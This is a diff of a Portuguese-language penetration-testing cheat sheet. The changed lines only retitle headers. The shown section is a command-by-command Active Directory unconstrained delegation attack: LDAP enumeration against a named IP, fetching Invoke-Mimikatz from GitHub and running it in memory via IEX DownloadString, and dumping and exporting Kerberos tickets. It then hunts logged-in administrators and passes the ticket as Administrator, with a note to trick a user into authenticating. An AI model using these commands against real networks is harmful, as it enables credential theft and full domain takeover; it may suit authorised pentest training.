@@ -1271,7 +1271,7 @@ $LDAPSEARCH.FindAll()
 ldapsearch -LLL -x -h 54.189.219.43   -D "vegeta@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
 ldapsearch -LLL -x -h 54.189.219.43   -D "regularuser@tech.local" -W -b "DC=tech,DC=local" "(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" | grep sAMAccountName
 ```
-##### UNCONSTRAINED DELEGATION - DEPOIS DE COMPROMETER O SERVIDOR COM UD, EXPORTAS OS TICKETS KERBEROS.
+##### UNCONSTRAINED DELEGATION - DEPOIS DE COMPROMETER O SERVIDOR COM UD, EXPORTAR OS TICKETS KERBEROS.
 ```
 curl https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1 -Outfile Invoke-Mimikatz.ps1
 Import-Module .\Invoke-Mimikatz.ps1
@@ -1281,21 +1281,22 @@ Invoke-Mimikatz
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Mimikatz.ps1")
 Invoke-Mimikatz
 ```
-MIMIKATZ - LISTAR OS TICKETS / EXPORTAR OS TICKETS  (WAIT OR TRICK AN USER TO USE THE UNCONSTRAINED DELEGATION SERVICE)
+##### UNCONSTRAINED DELEGATION - LISTAR OS TICKETS / EXPORTAR OS TICKETS COM MIMIKATZ (WAIT OR TRICK AN USER TO USE THE UNCONSTRAINED DELEGATION SERVICE)
 ```
 sekurlsa::tickets
 sekurlsa::tickets /export
 ```
+##### UNCONSTRAINED DELEGATION - VERIFICAR QUEM ESTÁ LOGADO EM UMA MÁQUINA / ONDE UM USUARIO ESTÁ LOGADO
 AGUARDAR ALGUM USUARIO SE CONECTAR E FICAR MONITORANDO (OPTIONAL) (PRECISA DE ALGUM TIPO DE ADMIN)
 ```
 Invoke-UserHunter -ComputerName server01  -Delay 5 -Verbose
 Invoke-UserHunter -ComputerName server01 -UserIdentity administrator -Delay 5 -Verbose
 ```
+##### UNCONSTRAINED DELEGATION - REUTILIZAR O TICKET DO USUARIO:
 FILTRAR OS TICKETS (OPCIONAL)
 ```
 dir *.kirbi | findstr /I krbtgt | findstr /V "$@"
 ```
-REUTILIZAR O TICKET DO USUARIO:
 ```
 kerberos::ptt C:\pentest\tickets\[0;9fc25]-2-0-60a10000-Administrator@krbtgt-TECH.LOCAL.kirbi
 ```
